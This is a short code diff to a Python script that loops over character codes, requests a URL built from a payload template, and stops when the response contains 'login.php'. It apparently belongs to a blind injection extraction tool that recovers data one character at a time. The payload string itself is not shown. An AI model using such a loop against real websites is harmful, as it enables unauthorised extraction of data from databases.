@@ -12,10 +12,8 @@ def fun(url,result,result2):
     for i in range(result2):
         # try:
             reponse=requests.get(url+data.format(result,i),timeout=0.5)
-            print(1)
-            if 'div' in reponse.text:
-                # print(result,url+data.format(result,i),chr(i))
-                print(reponse.text)
+            if 'login.php' in reponse.text:
+                print(result,url+data.format(result,i),chr(i))
                 break
         # except:
         #     print("error\n")
